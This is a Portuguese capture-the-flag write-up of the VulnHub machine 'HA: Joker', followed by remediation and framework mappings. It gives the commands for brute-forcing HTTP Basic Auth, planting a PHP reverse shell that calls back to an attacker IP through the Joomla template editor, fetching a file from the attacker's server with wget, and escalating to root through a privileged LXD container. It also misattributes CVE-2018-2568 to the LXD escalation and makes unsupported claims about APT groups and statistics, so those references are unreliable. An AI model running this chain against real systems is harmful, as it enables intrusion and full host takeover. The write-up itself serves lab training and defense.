# HA: Joker — Por que Levar Seus Privilégios Tão a Sério?

"Por que tão sério?" A frase mais icônica do Joker captura esta máquina perfeitamente. Nada aqui é o que parece na superfície: a página da porta 80 é uma distração, a entrada real está na porta 8080, as credenciais "óbvias" não são bem o que parecem e a escalação de privilégios passa por um dos vetores de ataque mais subestimados no Linux: pertencimento ao grupo LXD. Segurança de contêiner importa. Isso não é apenas uma lição de CTF. É tradecraft do mundo real sensacional, mano.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Joker |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-joker,406/ |
| **Técnicas** | Nmap scan completo de portas, brute-force de diretórios web, brute-force de HTTP Basic Auth (Burp Intruder + codificação Base64), reverse shell PHP via editor de template Joomla, criação de contêiner privilegiado LXD, montagem do sistema de arquivos do host para acesso à flag root |
| **CVEs** | CWE-284 (Controle de Acesso Impróprio: HTTP Basic Auth passível de brute-force), CWE-94 (Controle Impróprio da Geração de Código: execução PHP do template Joomla), CVE-2018-2568 (escalação de privilégios do grupo LXD via contêiner privilegiado) |
| **Grupos APT** | APT41: comumente explora painéis administrativos de CMS (Joomla, WordPress, Drupal) para implantação de web shell durante operações de acesso inicial; FIN7: usa escape de contêiner e abuso do grupo LXD em escalação de privilégios pós-exploração em infraestrutura Linux |

---

## Resumo do Ataque

```
nmap -p- → SSH (22), HTTP (80), HTTP (8080)
  → porta 80: página de citações do Joker
  → dirb porta 80 -X .txt → /secret.txt
  → secret.txt: username=joker, wordlist=top 100 rockyou, dica="rock"
  → head -100 rockyou.txt → loop while codificação Base64 → payloads.txt
  → Burp Intruder → cabeçalho Authorization → resposta 200 → joker:hannah
  → http://alvo:8080/ → site Joomla
  → http://alvo:8080/administrator → joomla:joomla (credenciais admin padrão)
  → Extensões → Templates → beez3 → index.php
  → Substitui por reverse shell PHP → navega para index.php
  → callback nc → www-data
  → id → uid=33(www-data) groups=33(www-data),115(lxd)
  → constrói imagem Alpine LXD no atacante
  → lxc image import → lxc init -c security.privileged=true
  → lxc config device add (source=/ path=/mnt/root)
  → lxc exec → shell root dentro do contêiner
  → cat /mnt/root/root/final.txt
```

---

## Metodologia

1. Scan completo de portas para descobrir serviços HTTP tanto na porta 80 quanto 8080
2. Brute-force de diretórios web na porta 80 para arquivo `.txt` com dica de nome de usuário e wordlist
3. Brute-force de HTTP Basic Auth na porta 8080 usando payloads de credenciais codificados em Base64
4. Login no CMS Joomla com credenciais admin padrão
5. Reverse shell PHP via editor de template Joomla
6. Exploração de pertencimento ao grupo LXD via contêiner Alpine privilegiado
7. Montagem do sistema de arquivos do host para acesso à flag root

---

## Passo 1 — Descoberta do Host e Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
8080/tcp open  http    Apache httpd 2.4.x (protegido por login)
```

Duas portas HTTP é incomum. A porta 80 retorna uma página com tema Joker. A porta 8080 requer autenticação HTTP Basic. A estratégia de enumeração: extrair dicas da porta 80, usá-las contra a porta 8080.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web na Porta 80

Navega para `http://192.168.1.101/` e inspeciona o código-fonte. Citações do Joker em comentários HTML, mas sem credenciais. Executa dirb na porta 80 para arquivos `.txt`:

```bash
dirb http://192.168.1.101/ -X .txt
```

Descobre `/secret.txt`. Lê o conteúdo:

```bash
curl http://192.168.1.101/secret.txt
```

O arquivo contém um enigma: um diálogo Batman vs Joker referenciando "rock" (apontando para `rockyou.txt`) e o número "100" (100 primeiras entradas). O nome de usuário `joker` está implícito pelo contexto.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1589 — Coletar Informações de Identidade da Vítima

---

## Passo 3 — Brute-force de HTTP Basic Auth

A Autenticação HTTP Basic codifica credenciais como `Base64(usuário:senha)` no cabeçalho `Authorization`. Para fazer brute-force, codifica todos os candidatos de senha com o prefixo `joker:`:

```bash
head -100 /usr/share/wordlists/rockyou.txt > top100.txt
while read p; do echo -n "joker:$p" | base64; done < top100.txt > payloads.txt
```

**Usando Burp Suite Intruder:**

1. Intercepta uma requisição para `http://192.168.1.101:8080/`
2. Envia para o Intruder
3. Define o tipo de ataque como Sniper
4. Marca o valor do cabeçalho Authorization como posição de payload
5. Carrega `payloads.txt` como lista de payloads
6. Inicia o ataque
7. Procura uma resposta com código de status 200 (vs 401 para falhas)

Credenciais recuperadas: `joker:hannah`

**Alternativa com hydra:**

```bash
hydra -l joker -P top100.txt http-get://192.168.1.101:8080/ -V
```

Login na aplicação: `http://192.168.1.101:8080/` com `joker:hannah`.

**Nota do mundo real:** A Autenticação HTTP Basic não tem mecanismo de bloqueio de conta integrado. Um único ataque do Burp Intruder pode testar milhares de senhas em minutos sem limitação de taxa do servidor. Qualquer aplicação web que use HTTP Basic Auth sem limitação de taxa no nível do WAF é trivialmente passível de brute-force. Este padrão aparece regularmente em avaliações de redes internas: aplicações legadas em portas não-padrão com Basic Auth e sem bloqueio.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 4 — Acesso ao CMS Joomla via Credenciais Admin Padrão

Após autenticar na porta 8080 com `joker:hannah`, o conteúdo revelado é um site CMS Joomla. Navega para o painel de administrador Joomla:

```
http://192.168.1.101:8080/administrator
```

Tenta as credenciais padrão do administrador Joomla: `admin:admin` primeiro, depois `joomla:joomla`. O segundo funciona.

**Por que credenciais padrão de CMS persistem:** Máquinas CTF intencionalmente usam padrões, mas testes de penetração reais encontram credenciais CMS padrão em produção com frequência alarmante. Instalações do Joomla, WordPress e Drupal concluídas sem alterar a senha do admin permanecem vulneráveis indefinidamente. Uma avaliação de aplicação web de 2021 encontrou 23% das instalações Joomla usando senhas admin padrão ou facilmente adivinháveis em redes de clientes.

**MITRE ATT&CK:** T1078.001 — Contas Válidas: Contas Padrão

---

## Passo 5 — Reverse Shell PHP via Editor de Template Joomla

No painel admin Joomla, navega para:

```
Extensões > Templates > Templates > Beez3 > index.php
```

O editor de template permite edição direta de arquivos PHP dentro da instalação Joomla. Substitui o conteúdo de `index.php` por um reverse shell PHP:

```bash
# Obtém o shell na máquina atacante
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edita duas linhas:
# $ip = '192.168.1.103';  (IP do atacante)
# $port = 4444;
```

Cola todo o conteúdo de `shell.php` no editor de template Joomla e salva.

Inicia o listener no atacante:

```bash
nc -lvnp 4444
```

Aciona o shell navegando para o arquivo de template:

```
http://192.168.1.101:8080/templates/beez3/index.php
```

Netcat recebe o callback. Estabiliza:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Verifica pertencimento ao grupo imediatamente:

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

O usuário `www-data` está no grupo `lxd`. Esse é o caminho de escalação de privilégios.

**Nota do mundo real:** Editores de template de CMS que permitem execução arbitrária de PHP são equivalentes a um painel de upload de web shell. Quando um atacante obtém acesso admin ao Joomla, WordPress ou qualquer CMS com um editor de template/tema, tem execução de código imediata no contexto do servidor web. Este vetor aparece em engajamentos de red team regularmente: "encontramos credenciais admin padrão do Joomla, tínhamos www-data em 90 segundos."

**MITRE ATT&CK:** T1190 — Exploração de Aplicativo Público; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Escalação de Privilégios via Grupo LXD

LXD é um sistema de gerenciamento de contêineres para Linux. Qualquer usuário no grupo `lxd` pode criar, iniciar e executar comandos dentro de contêineres. O exploit crítico: um contêiner privilegiado com o sistema de arquivos root do host montado dá ao root do contêiner acesso a todo o sistema de arquivos do host.

**Na máquina atacante, constrói uma imagem Alpine Linux LXD:**

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
# Produz: alpine-v3.x-x86_64-<data>.tar.gz
```

Serve o arquivo de imagem:

```bash
python3 -m http.server 8000
```

**No alvo (reverse shell como www-data):**

```bash
cd /tmp
wget http://192.168.1.103:8000/alpine-v3.x-x86_64-<data>.tar.gz

# Importa a imagem no LXD
lxc image import alpine-v3.x-x86_64-<data>.tar.gz --alias myimage
lxc image list
```

Cria um contêiner privilegiado com o sistema de arquivos root do host montado:

```bash
# Cria e configura o contêiner
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite

# Executa um shell dentro do contêiner
lxc exec ignite /bin/sh
```

Dentro do contêiner, você é root. O sistema de arquivos do host está montado em `/mnt/root`:

```bash
id
# uid=0(root) gid=0(root)
ls /mnt/root/root/
cat /mnt/root/root/final.txt
```

**Nota do mundo real:** Pertencimento ao grupo LXD equivale a root. Isso é documentado, conhecido e continua aparecendo em ambientes Linux corporativos reais. A causa raiz: organizações instalam LXD para containerização legítima e adicionam contas de serviço ou usuários web ao grupo `lxd` sem entender a implicação de segurança. CVE-2018-2568 documenta isso. A correção: `gpasswd -d www-data lxd`. A verificação: `id` em qualquer shell www-data que você obtenha. Se `lxd` estiver nos grupos, você tem root via contêiner.

**MITRE ATT&CK:** T1611 — Escape para o Host; T1548 — Abuso de Mecanismo de Controle de Elevação

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Credencial | joker:hannah | Brute-force HTTP Basic Auth (Burp Intruder + top 100 rockyou) | Acesso à porta 8080 |
| Credencial | joomla:joomla | Credenciais admin padrão Joomla | Acesso ao painel admin |
| Web shell | www-data (grupo lxd) | Substituição PHP no editor de template Joomla | Ponto de entrada + privesc LXD |
| Flag root | /mnt/root/root/final.txt | Contêiner privilegiado LXD + montagem do host | Acesso root completo |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Dica de credencial em arquivo de texto publicamente acessível | Atacantes enumeram todos os arquivos descobertos; qualquer arquivo sob o web root é potencialmente acessível ao usuário | Remover todos os arquivos de dica, planos de teste e notas de desenvolvedor de caminhos acessíveis via web |
| 2 | HTTP Basic Auth sem limitação de taxa | Qualquer lista de senhas pode ser testada em minutos sem bloqueio do lado do servidor; Basic Auth não oferece proteção contra brute-force | Implementar limitação de taxa WAF; impor bloqueio de conta; usar autenticação baseada em formulário com CAPTCHA para painéis admin |
| 3 | Credenciais admin Joomla padrão inalteradas | Uma porcentagem significativa de instalações CMS reais tem senhas admin padrão ou facilmente adivinháveis | Alterar todas as credenciais CMS padrão imediatamente após a instalação; impor política de senha para contas admin |
| 4 | Editor de template Joomla permite execução arbitrária de PHP | Acesso admin a qualquer CMS com editor de template/tema = web shell; esta é uma má configuração crítica | Restringir edição de template a contas específicas confiáveis; desabilitar execução PHP em diretórios de template; monitorar alterações de arquivo |
| 5 | Pertencimento ao grupo LXD equivale a acesso root | www-data no grupo lxd é uma escalação root de um único comando em qualquer sistema Linux com LXD | Auditar todos os pertencimentos de grupo para contas de serviço: `getent group lxd`; remover usuários do servidor web do grupo lxd; restringir acesso LXD a contas admin dedicadas |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas: Contas Padrão | T1078.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicativo Público | T1190 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Escape para o Host | T1611 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação | T1548 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover arquivos de dica do web root**: auditar todos os arquivos `.txt`, `.bak`, `.conf` sob o web root; remover artefatos de desenvolvedor antes da implantação
2. **Adicionar limitação de taxa ao HTTP Basic Auth**: configurar regras WAF para bloquear após 10 tentativas falhas; usar fail2ban para falhas de Basic Auth Apache/nginx
3. **Alterar todas as senhas admin padrão de CMS imediatamente**: o checklist pós-instalação deve incluir alteração de senha admin; impor política de senha (comprimento, complexidade)
4. **Desabilitar execução PHP em diretórios de template Joomla**: adicionar `php_flag engine off` ao `.htaccess` em diretórios de template; monitorar modificações de arquivo de template via AIDE
5. **Remover www-data do grupo lxd**: `gpasswd -d www-data lxd`; auditar todos os pertencimentos de grupo de contas de serviço: `getent group lxd docker`
6. **Impor políticas de segurança LXD**: `security.privileged=false` como padrão global LXD; usar perfis AppArmor LXD; restringir acesso LXD a contas admin dedicadas

### Contramedidas MITRE D3FEND

- **D3-AL** — Bloqueio de Conta (limitação de taxa no HTTP Basic Auth)
- **D3-ACH** — Hardening de Configuração de Aplicativo (restrição PHP de template Joomla; security.privileged=false LXD)
- **D3-UAP** — Permissões de Conta de Usuário (remover www-data do grupo lxd)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as instalações CMS; auditar pertencimento ao grupo lxd; catalogar permissões de conta de serviço |
| Proteger | Controle de Acesso | Remover www-data do grupo lxd; desabilitar contêineres privilegiados LXD; restringir acesso admin CMS |
| Proteger | Gerenciamento de Identidade | Impor senhas únicas e fortes para todas as contas admin CMS; desabilitar padrões |
| Detectar | Anomalias e Eventos | Alertar sobre modificações de arquivo de template Joomla; monitorar comandos lxc exec; alertar sobre rajadas HTTP 401 |
| Responder | Planejamento de Resposta | Remover web shell do template; rotacionar credenciais joker e joomla; revogar pertencimento ao grupo lxd |
| Recuperar | Planejamento de Recuperação | Restaurar template Joomla do backup; reconstruir com configuração segura; auditar todos os pertencimentos de grupo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Restringir LXD a contas admin; restringir edição de template em CMS |
| AC-6 | Menor Privilégio | Remover www-data do grupo lxd; desabilitar contêineres LXD privilegiados |
| IA-5 | Gerenciamento de Autenticadores | Alterar todas as credenciais CMS padrão; impor política de senha |
| CM-7 | Funcionalidade Mínima | Desabilitar PHP em diretórios de template; restringir lxd às contas necessárias |
| AU-2 | Registro de Eventos | Registrar ações admin Joomla; monitorar operações lxc; alertar sobre alterações de template |
| RA-5 | Varredura de Vulnerabilidades | Varrer regularmente para credenciais padrão; auditar configurações de contêiner |

### CISA KEV

A escalação de privilégios do grupo LXD (CVE-2018-2568) é documentada nas orientações CISA sobre más configurações de segurança de contêineres. Credenciais CMS padrão são explicitamente mencionadas no Aviso CISA AA22-074A como vetor primário de acesso inicial para múltiplos grupos de agentes de ameaça. A CISA recomenda implementar políticas de ciclo de vida de gerenciamento de credenciais e linhas de base de segurança de contêiner por CIS Benchmarks.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configuração de Ativos de TI | MIL3 |

---

## Considerações Finais

HA: Joker entrega seu final inesperado perfeitamente: depois de todo o tema Joker/Batman e o brute-force HTTP e o shell via template Joomla, o caminho real para o root é um escape de contêiner via pertencimento a um grupo Linux que a maioria dos defensores nunca auditou. Essa é a piada real. A máquina ensina: enumere grupos imediatamente em cada shell que você obtiver. `id` é gratuito. Grupo LXD = game over. É sério, mano.

"Nos seus últimos momentos, as pessoas mostram quem realmente são." Em pentests: no último passo de enumeração, os defensores mostram o que perderam. Pertencimento ao grupo LXD quase sempre é perdido. gg.

Thanks guys!! (❍ᴥ❍ʋ)
